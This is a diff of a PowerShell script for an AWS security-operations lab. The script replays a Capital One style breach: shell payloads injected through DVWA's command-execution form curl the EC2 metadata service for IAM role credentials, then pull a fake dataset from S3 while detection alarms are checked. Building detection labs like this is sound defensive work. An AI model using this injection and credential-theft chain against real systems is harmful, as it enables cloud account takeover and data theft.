@@ -9,6 +9,8 @@ param(
     [int]$AlarmWaitSeconds = 600,
     [ValidateRange(10, 60)]
     [int]$RequestTimeoutSeconds = 30,
+    [switch]$SkipAlarmWait,
+    [switch]$RequireSocReadyTake,
     [string]$ConfirmRun = ''
 )
 
@@ -22,21 +24,45 @@ $objectKey = 'validation/capital-one-demo.csv'
 $trainingMarker = 'FAKE_TRAINING_DATA'
 $imdsRoleUrl = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
 $minimumSessionRemainingMinutes = 30
+$socSecurityModulePath = Join-Path $terraformRoot 'automation\SocLab.Security.psm1'
+Import-Module $socSecurityModulePath -Force
+Import-Module (Join-Path $terraformRoot 'automation\SocLab.Runtime.psm1') -Force
 if (-not $EvidenceRoot) {
     $EvidenceRoot = Join-Path (
         [Environment]::GetFolderPath('MyDocuments')
     ) 'aws-topology-evidence'
 }
 if (-not $ExperimentId) {
-    $ExperimentId = 'capital-one-' +
-        [datetimeoffset]::UtcNow.ToString('yyyyMMddTHHmmssZ')
+    $ExperimentId = New-SocTakeId
 }
 if (-not $TakeId) {
     $TakeId = $ExperimentId
 }
-foreach ($id in @($ExperimentId, $TakeId)) {
-    if ($id -notmatch '^[A-Za-z0-9][A-Za-z0-9._-]{2,80}$') {
-        throw 'ExperimentId and TakeId must use safe path characters.'
+if ($ExperimentId -notmatch '^[A-Za-z0-9][A-Za-z0-9._-]{2,80}$') {
+    throw 'ExperimentId must use safe path characters.'
+}
+if ($TakeId -cnotmatch '^capital-one-[0-9]{8}T[0-9]{6}Z-[a-f0-9]{8}$') {
+    throw 'TakeId must use the fixed capital-one-yyyyMMddTHHmmssZ-xxxxxxxx format.'
+}
+if ($RequireSocReadyTake.IsPresent) {
+    $socRuntimeRoot = Get-SocRuntimeRoot
+    $activeSessionPath = Join-Path $socRuntimeRoot 'active-soc-session.json'
+    if (-not (Test-Path -LiteralPath $activeSessionPath -PathType Leaf)) {
+        throw 'The active SOC session is unavailable.'
+    }
+    $activeSession = Get-Content -LiteralPath $activeSessionPath -Raw | ConvertFrom-Json
+    if ([int]$activeSession.schema_version -ne 1 -or
+        [string]$activeSession.status -notin @('READY','ATTACK_STARTED') -or
+        [string]$activeSession.take_id -cne $TakeId -or
+        [string]$activeSession.session_path -notlike "$socRuntimeRoot\soc-*" -or
+        -not (Test-Path -LiteralPath ([string]$activeSession.session_path) -PathType Container)) {
+        throw 'The requested attack is not bound to the active READY SOC session.'
+    }
+    $activeTake = Read-SocTakeRecord -RuntimeRoot ([string]$activeSession.session_path)
+    if ([string]$activeTake.take_id -cne $TakeId -or
+        [string]$activeTake.status -notin @('READY','ATTACK_STARTED') -or
+        [datetimeoffset]$activeTake.expires_at_utc -le [datetimeoffset]::UtcNow) {
+        throw 'The requested attack is not bound to one unexpired READY TAKE.'
     }
 }
 
@@ -105,7 +131,8 @@ function Invoke-DvwaForm {
     param(
         [Parameter(Mandatory)][uri]$Uri,
         [Parameter(Mandatory)]$Session,
-        [Parameter(Mandatory)][hashtable]$Body
+        [Parameter(Mandatory)][hashtable]$Body,
+        [hashtable]$Headers = @{}
     )
 
     try {
@@ -116,6 +143,7 @@ function Invoke-DvwaForm {
             -UseBasicParsing `
             -TimeoutSec $RequestTimeoutSeconds `
             -Body $Body `
+            -Headers $Headers `
             -ErrorAction Stop
     } catch {
         throw 'The fixed DVWA form request failed.'
@@ -295,6 +323,7 @@ Write-Host 'Target: Terraform application_url -> fixed /vulnerabilities/exec/'
 Write-Host "Fixed object key: $objectKey"
 Write-Host "Expected fake rows / SHA-256: $expectedRecordCount / $expectedContentSha256"
 Write-Host "Alarm before TAKE: $($alarmBefore.StateValue)"
+Write-Host "Alarm wait after attack: $(-not $SkipAlarmWait.IsPresent)"
 Write-Host "Experiment / TAKE: $ExperimentId / $TakeId"
 Write-Host 'Account ID, bucket, cookies, command response, and credentials are not printed.'
 
@@ -330,6 +359,7 @@ $credentialDocument = $null
 $credentialResponse = $null
 $roleResponse = $null
 $webSession = $null
+$takeIdHeaderPostCount = 0
 
 try {
     New-Item -ItemType Directory -Path $tempRoot | Out-Null
@@ -387,6 +417,9 @@ try {
     $execPage = $null
 
     $failureStage = 'imds-role-discovery'
+    $attackHeaders = @{
+        'X-SOC-TAKE-ID' = $TakeId
+    }
     $roleStart = '__CAPITAL_ROLE_BEGIN__'
     $roleEnd = '__CAPITAL_ROLE_END__'
     $rolePayload = (
@@ -394,10 +427,11 @@ try {
         "curl -s --max-time 5 $imdsRoleUrl; " +
         "printf '\n$roleEnd\n'"
     )
-    $roleResponse = Invoke-DvwaForm -Uri $execUri -Session $webSession -Body @{
+    $roleResponse = Invoke-DvwaForm -Uri $execUri -Session $webSession -Headers $attackHeaders -Body @{
         ip = $rolePayload
         Submit = 'Submit'
     }
+    $takeIdHeaderPostCount++
     if ($roleResponse.Headers['X-Amz-Cf-Id']) {
         $roleRequestEdgeId = [string]$roleResponse.Headers['X-Amz-Cf-Id']
     }
@@ -421,10 +455,11 @@ try {
         "curl -s --max-time 5 $imdsRoleUrl$expectedRoleName; " +
         "printf '\n$credentialEnd\n'"
     )
-    $credentialResponse = Invoke-DvwaForm -Uri $execUri -Session $webSession -Body @{
+    $credentialResponse = Invoke-DvwaForm -Uri $execUri -Session $webSession -Headers $attackHeaders -Body @{
         ip = $credentialPayload
         Submit = 'Submit'
     }
+    $takeIdHeaderPostCount++
     if ($credentialResponse.Headers['X-Amz-Cf-Id']) {
         $credentialRequestEdgeId = [string]$credentialResponse.Headers['X-Amz-Cf-Id']
     }
@@ -526,23 +561,27 @@ try {
         "rows=$recordCount sha256=$contentSha256"
     )
 
-    $failureStage = 'alarm-transition'
-    $alarmDeadline = [datetimeoffset]::UtcNow.AddSeconds($AlarmWaitSeconds)
-    do {
-        $alarmNow = Get-AlarmSnapshot -AlarmName ([string]$detection.alarm_name)
-        $alarmUpdatedAt = [datetimeoffset]$alarmNow.StateUpdatedTimestamp
-        if ([string]$alarmNow.StateValue -ceq 'ALARM' -and
-            $alarmUpdatedAt -ge $startedAt) {
-            $alarmTransitioned = $true
-            $alarmUpdatedAtUtc = $alarmUpdatedAt.ToUniversalTime().ToString('o')
-            break
+    if ($SkipAlarmWait.IsPresent) {
+        Write-Host 'Capital One alarm wait: skipped for the separate low-latency SOC path.'
+    } else {
+        $failureStage = 'alarm-transition'
+        $alarmDeadline = [datetimeoffset]::UtcNow.AddSeconds($AlarmWaitSeconds)
+        do {
+            $alarmNow = Get-AlarmSnapshot -AlarmName ([string]$detection.alarm_name)
+            $alarmUpdatedAt = [datetimeoffset]$alarmNow.StateUpdatedTimestamp
+            if ([string]$alarmNow.StateValue -ceq 'ALARM' -and
+                $alarmUpdatedAt -ge $startedAt) {
+                $alarmTransitioned = $true
+                $alarmUpdatedAtUtc = $alarmUpdatedAt.ToUniversalTime().ToString('o')
+                break
+            }
+            Start-Sleep -Seconds 10
+        } while ([datetimeoffset]::UtcNow -lt $alarmDeadline)
+        if (-not $alarmTransitioned) {
+            throw 'The bounded wait ended before a new Capital One alarm transition appeared.'
         }
-        Start-Sleep -Seconds 10
-    } while ([datetimeoffset]::UtcNow -lt $alarmDeadline)
-    if (-not $alarmTransitioned) {
-        throw 'The bounded wait ended before a new Capital One alarm transition appeared.'
+        Write-Host "Capital One alarm: new ALARM transition at $alarmUpdatedAtUtc"
     }
-    Write-Host "Capital One alarm: new ALARM transition at $alarmUpdatedAtUtc"
 } catch {
     $failureType = $_.Exception.GetType().FullName
 } finally {
@@ -562,6 +601,16 @@ try {
     $roleResponse = $null
     Remove-Item -LiteralPath $tempRoot -Recurse -Force -ErrorAction SilentlyContinue
     $finishedAt = [datetimeoffset]::UtcNow
+}
+
+$credentialEnvironmentCleared = @(
+    $credentialEnvironmentNames | Where-Object {
+        [Environment]::GetEnvironmentVariable($_, 'Process')
+    }
+).Count -eq 0
+if (-not $credentialEnvironmentCleared) {
+    $failureStage = 'credential-environment-cleanup'
+    $failureType = 'SocLab.CredentialEnvironmentCleanupFailed'
 }
 
 $record = [ordered]@{
@@ -587,11 +636,15 @@ $record = [ordered]@{
     RecordCount = $recordCount
     ContentSha256 = $contentSha256
     AlarmStartedOk = $true
+    AlarmWaitSkipped = $SkipAlarmWait.IsPresent
     AlarmTransitioned = $alarmTransitioned
     AlarmUpdatedAtUtc = $alarmUpdatedAtUtc
     RoleRequestEdgeId = $roleRequestEdgeId
     CredentialRequestEdgeId = $credentialRequestEdgeId
+    TakeIdHeaderPostCount = $takeIdHeaderPostCount
+    TakeIdHeaderSent = ($takeIdHeaderPostCount -eq 2)
     CredentialHandling = 'memory-only; values never printed or persisted'
+    TemporaryCredentialEnvironmentCleared = $credentialEnvironmentCleared
     BucketPersisted = $false
     FailureStage = if ($failureType) { $failureStage } else { '' }
     FailureType = $failureType
